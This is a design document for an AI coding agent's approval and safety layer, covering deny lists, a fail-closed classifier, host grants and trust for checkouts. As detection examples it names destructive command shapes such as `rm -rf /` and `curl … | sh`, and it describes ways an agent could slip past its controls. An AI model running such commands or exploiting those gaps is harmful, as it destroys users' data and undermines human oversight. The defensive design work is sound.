# Approvals and safety

shhh runs things on your machine. Everything here exists to make sure that
happens only when you meant it to, and that when you decide, you are deciding
with the facts.

## The three tiers

Tools are separated by what they can do, and the separation is structural
rather than a flag consulted at call time. Reads run without asking, because a
read changes nothing and asking about it teaches you to stop reading prompts.
Commands and writes need an answer.

The dispatch paths are different functions rather than one function with a
branch. A dispatcher with no case for a mutating tool cannot be talked into
running one, by a bug or by a model that has learned to ask nicely. This is the
codebase's most important invariant and the easiest to erode, because merging
the paths always looks like a simplification.

## The four modes

How much has been decided in advance:

- **Manual** — every command and every write is asked.
- **Accept-edits** — writes proceed, commands are asked. This is the mode for
  work where the edits are the point and you will review them at the end.
- **Auto** — a classifier decides, and asks when it is not sure.
- **Plan** — nothing runs at all; the session proposes an ordered list of what
  it would do, and you approve the plan rather than the steps.

Plan mode is not a safety mode with the volume turned up. It is a different
activity: deciding whether the approach is right, before any of it is worth
approving individually.

## A deny list is answered before anything can allow

Two lists of command prefixes belong to the person and to nobody else. The
allowlist says what may run without being asked about. The deny list says
what may not run at all, and it is read first — before the allowlist, before
the session's own grants, before the mode, and before the classifier is paid
to think about it. `git push` or `terraform apply` on that list never becomes
a card, in any mode, headless included, with the flag that approves
everything set.

Deny beats allow because the two are answers to different questions. An
allowlist entry means "stop asking me about this"; a deny list entry means
"this is not a decision". A command on both is denied, and that is not a
conflict to resolve — a person who has said both has said the second one
about a narrower thing.

Both lists match the same way: the leading words of a command against the
words of an entry, so `git push` covers `git push origin main` and does not
cover `git pushall`. They read a chain differently, and deliberately. The
allowlist refuses to match a line carrying shell punctuation at all, because
a prefix it could be talked into misreading would be a grant; over-reading
there costs one prompt. The deny list reads every command the line will
actually run, because a refusal it could be talked into missing would be the
hole it was written to close. Over-reading here costs a refusal the reader
can see is wrong and can correct in one line of their configuration.

What "every command the line will actually run" covers is the next section:
the deny list and the list of dangerous shapes are asked the same question
about the same text, and they read it with the same code, so a spelling one
of them learns is a spelling both of them know.

A refused command draws the rule denial, not yours, and the reason names the
list so the reader knows which file to open. What the model is told is that
the command will not run in this session however it is spelled, and nothing
about where the list lives: the list is the user's, and a refusal that came
with editing instructions would be handing over the way around it. Neither
list is reachable by any tool. A checkout can add to either through its own
settings file, and only add — a repository may refuse one more command here
and may never take away a refusal the person holds everywhere.

## A host is granted once

A fetch is the one act a read-only session still has that is not free, and
the card that asks about it names one fact above the others: the host the
request leaves for. So the host is what `[a]` grants. Pressing it on
`docs.python.org` means the twentieth page of that documentation site is not
the twentieth card, and in auto mode it is not twenty classifier rounds
either — the classifier is asked whether a URL is an outbound channel worth
stopping for, and the grant is the person having already said this host is
not.

The unit is the host and neither the URL nor the domain. One URL is one
page, which would grant nothing worth having. The registrable domain is
every subdomain a company will ever publish, which is not what anybody read
on the card. The host is what the card printed and what the person looked
at, so it is what the grant is made of — exactly, never as a suffix.
`docs.python.org` does not grant `python.org`, and it does not grant
`docs.python.org.evil.test` either.

A grant is a session's, and it travels the way the other grants travel: it
is listed by `/permissions grants`, counted on the status line, taken back
by `/permissions revoke`, and inherited by every child the session spawns.
A child arrives with the set and has no way to add to it — the supervisor
reads the parent's grants at every decision and nothing points the other way
— so a fan-out cannot widen what the person answered for. The spawn card
says so, listing the hosts the child arrives with.

The standing form of the same thing is `web.allow_hosts` in the
configuration, and `web.deny_hosts` is the refusal that beats it, read
before the grant, before the mode and before the classifier, exactly as the
command deny list is. A checkout may add to the deny list and may never add
to the allow list: which commands a repository refuses is a fact about the
repository, and where a session's reads leave for is not.

There is one place a grant could widen itself where nobody would see it: a
redirect is the granted host choosing the next host. So a hop that starts on
a granted host is not followed to a host nobody has answered for, wherever
in a chain of redirects it falls. The fetcher stops and names the URL to ask
about, and the next call draws that host's card. A hop that starts anywhere
else follows its redirects — a fetch approved on a card was the person
answering for that request, and a redirect is part of what a request is —
and a session holding no grants is not held anywhere by this rule.

## The classifier fails closed

Auto mode's classifier never approves on error. A timeout, a malformed answer,
an unreachable provider — each falls back to asking the human. There is no
path through the code where "we could not decide" becomes "yes".

This is worth stating as a commitment because the opposite is the natural way
to write it. A classifier that returns a boolean gets a zero value, and the
zero value has to be the one that costs nothing.

Where there is no human to fall back to — a scripted run in auto mode, a
served session told nobody is attached — the fallback is a refusal instead,
which is the same commitment with the one remaining answer taken away
([`headless.md`](headless.md#auto-mode-fails-closed)).

## The classifier is shown what the session did, never what it read

The evidence a verdict is reached on is the recent conversation, the proposed
call, and a line for each of the session's recent tool calls: the tool's name,
the one argument worth showing, and whether it worked.

The rows are there because one of the rules cannot be answered without them.
The classifier is asked to deny an action that runs instructions obtained from
untrusted content, and in a coding session most of what happens between two
sentences is tool calls with no prose at all — so a command proposed straight
after a fetch was being judged on the user's opening request and nothing else.
The rows put the fetch back in front of it.

**What they carry is a name and an outcome word, never output.** A verdict
decides what runs, so a fetched page able to write into the evidence would be
writing its own permission. What a call was pointed at is the agent's own
words and may appear; what came back is somebody else's and does not, however
useful it would be. That is the same boundary the reading a run is steered by
draws, for the same reason
([`coding-agent.md`](coding-agent.md#the-verdict-is-a-steering-signal-so-the-digest-is-a-boundary)).

The rule the classifier is *not* asked to enforce is the boundary a person
states in words — "don't push", "read only". Approving already requires the
action to stay inside the boundaries the user set, and a command a person
wrote down as never is refused by the deny list before any model is paid to
think about it. A rule stated twice is a rule with two places to drift.

## Blast radius

An approval that names the action but not its consequences pushes the risk
assessment onto the reader, at speed, twenty times a session. They will stop
doing it, and the prompt becomes a keystroke.

So every approval answers three questions before it offers a key:

- **What it touches.** Resolved paths, described from the filesystem — how
  many files, how large, or that it does not exist yet.
- **Whether it can be taken back.** Whether the paths are tracked, partially
  tracked, or not tracked at all, or whether nothing in the workspace changes.
- **Whether the network is open.** What containment actually allows right now
  — not what the command appears to want, and not what was configured.

**Resolution is honest about its limits.** Where the paths a command will
touch cannot be determined, the card says that instead of reporting a
confident nothing. A blast-radius line that quietly under-reports is worse
than no line, because it is trusted.

## Severity moves the default

Where a command is flagged as dangerous, the safe key becomes the default and
running it takes a deliberate second key. The decision is taken once, on the
screen where the command appears, rather than as an afterthought prompt after
it has already been chosen.

A command that reaches execution without having been confirmed somewhere still
gets asked. There is no path that skips both.

## One act has many spellings

What counts as dangerous is a small table of verbs and the options they
carry, not a list of strings to look for. `rm -rf`, `rm -r -f`, `rm -fr` and
`rm -R --force` are one command written four ways, and a pattern that knows
the first is a pattern that stops working at the first person who types the
second. So the flag is read out of a bundle and from anywhere in the argument
list, the long spelling counts as the short one, and a command behind `sudo`
is the command it escalates.

The other half of the same failure is a chain. Each command in a line is read
separately, because the dangerous one is rarely the first, and a pattern
anchored to the start of a line sees `make clean` in `make clean && rm -rf /`
and nothing else. A command is also read where it is being carried rather
than typed: what an interpreter was handed (`sh -c "rm -rf /"`), what a
search was told to run over what it found (`find . -exec rm -rf {} \;`), and
what sits behind an escalation and that escalation's own options. `sudo -E`
and `sudo -u root` are the two spellings that walk past a reader which stops
at the first flag, so what follows an escalation is offered at every word:
shhh cannot tell the value of `-u` from the command behind it without
knowing sudo's option table, and guessing in the safe direction costs one
visible refusal.

Force is not what makes a recursive delete permanent — it only stops `rm`
asking about a write-protected file — so recursion alone is enough to move
the key. The same reading covers the spellings people reach for when they are
in a hurry: a `find` with `-delete`, a `git clean -fdx`, a `git checkout` of
a pathspec rather than a branch, a `chmod 777` with or without `-R`.

What stays a pattern in the text is what genuinely is one: a redirection onto
a device, a pipe into an interpreter, a statement in SQL. A table straining
to describe those would say less than the expression it replaced.

## A download run in a second step is the same download

`curl https://example.com/i.sh | sh` is flagged, and the always-ask it moves
the key to is one no mode and no classifier can override. Take the pipe out
and give the file a name — fetch it, then run it on the next command of the
same line — and it is the same untrusted code executed the same way, so it
is read the same way. What makes it that act rather than an ordinary build is
where the file came from: it has to have been written earlier on that line by
something that fetches, as a named output, as a redirection, or as the last
element of the URL, which is where a fetch with no output named puts it.

The anchor is deliberately that narrow. A rule that asked only whether an
interpreter was handed a file something on the line had written would put a
HIGH card in front of every project that builds a bundle and then runs it,
and a warning nobody agrees with is a warning everybody dismisses. An
interpreter pointed at a file that was already there — a task runner, a
server, a checked-in script — says nothing here.

## Denials are two different facts

"You said no" and "a rule said no" are reported differently, and neither is
confusable with "it failed". The reader's next action depends on which one it
was — change your mind, or change your configuration — so collapsing them
destroys the only information they needed. A rule denial says which rule, and
the key on the row asks for the longer answer: the deny list, plan mode, a
path no grant can reach, or one of your own hooks
([`hooks.md`](hooks.md#a-hooks-deny-is-a-rule-denial)) are four different
things to go and change.

A denial is recorded as an act, and carries the mutation rail, because the
point of that rail is finding the moments that mattered.

## A no can say why, and a yes can say what next

A denial reached the model as one fixed sentence: the user declined. Whatever
the reader was thinking when they pressed the key — not that file, not with
that flag, not yet — was lost at the key, and a model that hears only *no*
tries the same act sideways, which the repeat detector then has to catch a
round later. Most denials mean *not like that*, and *like what* is the one
thing the model cannot find out on its own.

So the card's no has a second spelling that opens a note, and the sentence
the reader writes is what the model receives in place of the fixed one. It is
still the reader's denial: the row draws it in the reader's colour and word,
distinct from a rule's, with the note folded under it. A rule's denial never
carries a note, because a rule has nothing to say beyond which rule it was.

The yes has the same second spelling. A note beside an allow is steering: the
act runs, and the sentence joins the conversation before the next round, the
way a message typed while the turn works already does
([`../interface/surfaces.md`](../interface/surfaces.md#the-input-frame)). It
is offered on the card because the card is where the reader has the thought,
and a thought held until the act has finished is usually a thought lost.

## An amended command is a new command

A command card offers to run the command as the reader would have written
it. The reader edits the line in place, and what runs is their line. That
line is not the one the model asked about, so nothing decided about the
original carries over: the deny list is read against it, the dangerous shapes
are read against it, its blast radius is resolved again, and the card's three
questions are answered again before it runs. An amendment that would draw a
heavier card draws that card — including one that reaches a directory the card
the reader answered never named, since saying yes to it would put that
directory in the working scope for the rest of the session. Where any of that
refuses the amended line, the refusal is the amended line's — named on the
card, with the line still in the field, since a refusal that threw the line
away would take it at the moment the reader most wants it back — and the
original decision is still waiting.

The model is told what ran in place of what it asked for, in a sentence
ahead of the result rather than as a bare success: a model handed a plain
success reads it as a success of the command it proposed. The transcript row
records the line that ran and says the line was the reader's, because the
transcript is the account of what ran on this machine. An amendment is not a
grant: the next call the model makes is asked about on its own.

## A grant says when it ends

Always-allow grants exactly what the card printed — a command prefix, an
edit's directory, a fetch's host — and it granted it for the session. That is
the right length for a documentation site and the wrong one for a build loop:
twenty test runs in one turn want one answer, and the same answer standing for
the rest of the afternoon is a permission the reader will not remember making.

So a grant has a length, chosen where it is made: this turn, or this session.
A turn-scoped grant expires at the turn's close; a child spawned while it
stands inherits it and loses it when the turn that made it closes, as the
session does. A session grant travels the way it always has. Every grant is
listed with when it ends, counted on the status line while it stands, and can
be revoked before then. The two lengths are the whole set: a grant that
outlives the session is an allowlist entry in the configuration, and is typed
there rather than pressed here.

A grant also has a width, and the reader sees both before choosing. The
pattern the card printed is the ordinary width: a command's leading words, an
edit's directory. Beside it is the narrow one — the line exactly as it stands,
which covers `npm test` and not `npm test --update`; the one file, which
covers it and nothing beside it in its directory — for the reader who will say
yes to this and does not want to have said yes to its family. A fetch has no
narrow width to offer, because a host grant is already exactly the host and
never a suffix of it, so a fetch card offers the two lengths and stops.

A flagged action is offered no grant of any length. "Only for a minute" is
still blanket, and the card says the key is absent rather than dropping it
without a word.

## A file is changed from what was read

The mutating tools used to take their arguments' word for the file underneath
them. Replacing a file carries the whole new content and nothing about the
old, so it overwrote whatever was there — including a file the model had never
looked at, and a file that something else had changed since it did.

Both failures are silent, and both are worst where nobody is watching. A
session shows a diff before it applies anything, so a person can see a rewrite
built on a stale reading. A run with edits auto-approved shows that to nobody,
and a sub-agent working alongside the session is exactly the thing that
changes a file between one round and the next.

So a read records what it showed, and a mutation is checked against it. What
is recorded is a fingerprint of the content rather than a time, because
modification times are a coarse clock on some filesystems and the changes
worth catching are the ones that happened close together.

**The two tools are held to different standards, because they carry different
evidence.** Changing part of a file quotes the text it is replacing, and that
quote has to match exactly and uniquely — a snippet that does came from
somewhere, so an edit is not made to read the file first. Replacing a file
whole quotes nothing, so that one must have read the file, and read all of it:
replacing a file from a partial reading writes over the part that was never
seen.

Staleness applies to both, and to a preview as much as to the act, so a
decision is never put to a person for a change that will be refused after they
approve it.

Being told the file moved is a good outcome, not an obstacle. The instruction
that comes back says what to do — read it again and rebase the change on what
it says now — and one round spent re-reading is the cost of not silently
discarding somebody's work.

**The person is told too, and told which file.** The model gets the
instruction; the person gets a row naming the file and saying it changed since
it was read, with the model's own sentence folded under it. They are the only
party who can say *why* it changed — a second session, an editor, a build —
and a refusal reported as a malformed call takes that question away from them
before they know there was one. A call the model genuinely malformed keeps the
generic line, because the two failures are answered differently: one is
somebody else's work arriving, the other is a round the model will spend
again on its own.

**The same question is asked at the round boundary, not only at the change.**
Asked only at the change, the model spends a round writing something that
cannot land. Asked between rounds, it is told while there is still a round to
re-read in. So every file the model has been shown is re-checked where the
session takes its other readings of the tree, and the ones whose content no
longer matches are named there, in the same block. This is the half the
reading of the tree cannot do for itself: git names the paths that are dirty
and says nothing about what is in them, so a file that was already dirty when
somebody rewrote it in place looks identical either side of the change — and
the file being worked on is nearly always already dirty.

That re-check is cheap by construction. A file whose length changed holds
different content and is never opened; a file whose length and modification
time are both unchanged is taken as untouched; only the remainder is read and
hashed. A rewrite landing in the same second at the same length slips past
that prefilter and is still refused at the change, which hashes
unconditionally.

**The record belongs to a conversation, not to the machine.** One session at
a terminal, or one unattended run, is the only conversation in its process and
has the whole of it. A server holding several sessions over one checkout does
not: a file one session read and a second session then rewrote would be
recorded as freshly shown, so the first session's full overwrite would be
checked against the second session's content, match, and silently discard its
work — which is the one thing the record exists to refuse. So each served
session has a record of its own, and what it may overwrite is decided by what
*it* was shown.

**A conversation that comes back does not come back with its reading.** The
transcript says which files were read; nothing on the machine says what they
held, and they have had however long the conversation was closed to move. So
reopening one records each of those files as read-with-unknown-content: the
first change to one is refused and costs a round, against an edit applied to a
picture nobody can vouch for. A file the transcript never read keeps the
ordinary rule, because a quoted snippet is its own evidence. This is what
reopening means at every door — a session resumed from the command line, a
saved conversation loaded over the one on screen, and a served session that
begins from a conversation somebody else read, a fork's parent included.
Loading empties the record first, because what the conversation being
replaced was shown is no evidence about the one arriving. Starting a new conversation empties it and stops
there: a conversation that has said nothing yet has read nothing.

**A branch switch empties it too, and says so.** Switching rewrites every
tracked file that differs between the two branches, and the reading of the
tree cannot cover that: git compares the tree with its new HEAD, so a file the
switch put back to its committed state is not dirty afterwards and is never
named. So the record is dropped whole at the switch, and the switch's own
result says the working tree changed under every prior read. It is said rather
than left to be found: the refusal on its own arrives a round later, at a
change the model has already composed, and reads as a file nobody opened
rather than as the switch that made it stale. Dropping more than was strictly
necessary costs a re-read; keeping one record too many costs somebody's work.

## A closed verb set is what makes a read a read

Reading a repository's history — who last touched this line, when did this
change, what does this commit look like — used to arrive as a command, because
that is what `git` is. A command is asked about, so in the two careful modes
the reader saw a prompt and in the automatic one the classifier spent a round.
The result is an agent that guesses at history rather than asking, which is
the expensive failure: guessing is free at the moment it happens and wrong
much later.

So the reading half of git is its own tool, with five verbs and nothing else:
status, log, show, diff, blame. It runs like any other read, in every mode,
plan mode included.

The verb set is the whole security argument, and it has to be a set. A tool
that took a subcommand as text would be the command tool with a shorter name.
Because the subcommand can only be one of five, "this cannot commit, check
out, reset, push or clean" is a fact about how the arguments are built rather
than a promise about what the model intends. Everything git does that changes
the repository is still a command, and still asks.

The same reasoning excludes flags, not just subcommands. A read-only tool with
one flag that writes a file is not read-only, and a diff renderer that runs a
program named in someone's configuration is not a reader. Those flags have no
field to arrive in, and refs are restricted to a plain branch, tag or commit
so a value cannot become an option on its way through.

It also reaches past the arguments, because a repository carries configuration
and some of that configuration names a program to run. A repository you
cloned this morning can ask git to run something on every status. The reader
turns those settings off for its own calls, which matters more here than
anywhere else in the tool set: this is the one tool that runs unattended, in
every mode, with nobody asked first.

## The writing half of git is a tool too

Reading history became a tool because a read that asks is a read the agent
skips. Committing became one for the opposite reason: it is the act that
always asks, however many times you have said yes to it.

The allowlist cannot help. It refuses any line carrying shell punctuation —
that refusal is what keeps a pre-approved shape from becoming a chain — and a
commit message is quoted text. So `git commit -m "…"` is a classifier round in
auto mode and a card everywhere else, every single time, and the last thing a
turn does is the thing it interrupts you for.

Carrying the message as a field costs neither. The writing half of git is its
own tool with four verbs and nothing else: stage, commit, create a branch,
switch to one. Push, reset, clean, checkout of paths, rebase, merge, stash,
tag, `--amend`, `--force` and `--author` have no field to arrive in, exactly
as the reader's excluded verbs have none.

It is not a read, so it is not on the reader's tier. It sits at the write tier
and is answered the way an edit is answered: it applies where an edit applies,
it asks where an edit asks, and plan mode refuses it. The deny list is read
before any of that — an entry for `git commit` refuses the commit verb by the
same match the command path uses, because a person who wrote that line meant
the act and not the spelling, and a tool that let the act through under
another name would be the way around the list.

Two of its rules are things a shell cannot do.

**It stages only this session's own work.** `git add -A` stages your
uncommitted morning beside the agent's afternoon, and the commit that results
cannot be reverted, cited or read as a unit. This tool has no field for `-A`
and no field for a glob: it takes paths, one by one, and refuses by name any
path the session's own record of what it changed does not hold. The rule that
work already in the tree is not the agent's stops being a sentence in the
prompt and becomes a fact about the arguments.

**Hooks run only on a checkout you trust.** A commit hook is a program git
runs as you, and a checkout can point git at one inside itself. That is the
line trust already draws around everything else a clone can make a session
run, so a commit on an untrusted checkout passes `--no-verify` and the receipt
says `hooks skipped · checkout not trusted` rather than leaving you to
discover that the repository's own checks did not run.

What it cannot do, it says. An empty index is refused by name rather than
turned into an empty commit; `--allow-empty` has no field. An identity nobody
configured is git's own refusal, quoted, because inventing an author would
need `--author` and there is no field for that either. A switch that would
lose work is refused the way git refuses it, and no flag here discards
anything.

Push stays a command. It is the one verb that reaches the network, it is the
classifier prompt's own example of an external side effect, and a tool that
could push would need a card of its own — which is what `execute_command`
already is.

A commit is outside undo, and the turn's close says so where you can see it:
`/undo` restores files from the session's own records and leaves history
alone. The honest way back from a commit is `git revert`, which is a sentence
you type rather than a key shhh can offer.

**Your own commit is the same commit.** The turn's close offers one, and what
it stages is the same set by the same rule: the paths that turn's own records
hold, named one by one. The card names the files it is leaving behind before
you answer rather than afterwards — the promise is checkable at the moment it
matters, which is the only moment it is worth anything.

**A path is not enough of a promise.** `git add` stages what is on the disk,
not what a record says should be there, so a file the turn wrote and you have
edited since would carry your bytes into the commit under a card claiming it
carried the turn's. Those files are read before the card is drawn, compared
against what the turn left in them, and left out with a row of their own that
names them — and read again at the moment the index is touched, because the
card can sit on your screen for as long as you like. A tree that moved in
between makes no commit at all: less than the card said is not what you
answered.

Hooks run under the same trust answer, and a hook that refuses cancels the
whole thing: nothing is committed, the index goes back to what it was, and the
changeset is still there to offer again. Nothing is pushed. There is no push
verb on the tool, none on the card, and the remote stays yours to decide
about.

## A checkout declares what it runs

A clone arrives with more than code. It can name skills for the model to
activate, agent profiles carrying their own permission sets, quality suites
with command text in them, hooks to run at the session's own seams
([`hooks.md`](hooks.md#where-a-hook-is-written)), MCP servers to start, and
settings that say which commands run without asking — and every one of those runs as whoever
cloned it. None of them load until you have said so.

It is one answer about the whole checkout, given once: `shhh doctor trust`,
`[a]` on the doctor's trust row, or `/trust` in a session. It covers
`.shhh/skills`, `.agents/skills`, `.claude/skills`, `.shhh/agents`,
`.shhh/quality.json`, `.shhh/hooks.json`, `.shhh/mcp.json`, `.mcp.json`,
`.shhh/config.toml`, `.shhh/prompts` and `.shhh/todo/profile`, and what is
recorded is those files as they stand — so editing any of them, or writing
one that was not there, asks again. The
answer is kept outside the checkout, in the local store, because a file in
the checkout is the thing being decided about.

Withholding is a diagnostic and never an error. The session starts; it starts
smaller, and it says so — on the start screen, in `/status`, in a line before
a headless run begins, and as a row in `shhh doctor` with the offer on it.
Nothing but a person grants it: no permission mode reaches it, and the
classifier is never asked.

The instruction files are deliberately outside this set. `AGENTS.md`,
`CLAUDE.md` and `.shhh/project.md` are read whether or not the checkout is
trusted, because prose can only ask. The line between the two sets is what a
file can do on its own: instructions are a request the model may decline,
where a suite is a command line that runs. A wording under `.shhh/prompts` is
prose and still inside the set, on the other half of that same line — it is
not a file the model chooses to read, it is what shhh itself says at a stage
that changes the tree without asking
([`todo.md`](todo.md#the-stage-prompts-are-yours-to-edit)). A backlog profile
under `.shhh/todo/profile` is that text plus the shape of the run that sends
it — which steps there are, what each may do to the tree, where the person is
asked — so it is in the set on both counts
([`todo.md`](todo.md#a-profile-says-what-the-work-is)).

Trust granted inside a session takes effect in the next one. The prompt
naming the skills and the toolset holding the gate were both built when the
session started, and something that joined without being named would be
something the model does not know it has.

## Quality gates run what you wrote

A session can run a named suite of checks, and the check commands come from a
file in the workspace that *you* author. The model can ask for a suite by
name; it can never supply an executable or arguments. The file is read only
in a checkout you have trusted — it is the sharpest case of the section
above, because it is command text that runs without an approval — so in a
fresh clone the gate is not registered at all until you say so.

Every result is fingerprinted against the tree it ran over, so a passing
verdict can never silently vouch for code it did not see. The fingerprint
covers the content of every changed file and not merely the list of their
names: the file being worked on is almost always changed already, so a
verdict that tracked only which paths were dirty would keep reading as
current across exactly the edit that invalidated it. A tree holding more
changed content than the fingerprint will read is reported stale on
principle rather than guessed at. A gate that reports on stale state is worse
than no gate.

The suite can also be told to run on its own, as a turn closes over work it
changed. That changes nothing about what a check may do — the commands are
still only the ones in your file, still run read-only and contained where a
mechanism is available — and it changes nothing about the session's
permission mode either: a session that checks its own work may do exactly
what one that does not may do. What it changes is who asked. The name is one
key in the same trusted file, so turning it on is an edit to a file you own,
and a name that matches no suite is refused when the file is read rather than
at the close of the turn that was counting on it.

## Related

- [`hooks.md`](hooks.md) — your own commands at the same seams, and what one
  may and may not decide
- [`containment.md`](containment.md) — what stops a command that was approved
- [`../architecture.md`](../architecture.md) — why the tiers are structural
- [`../interface/surfaces.md`](../interface/surfaces.md) — the approval card
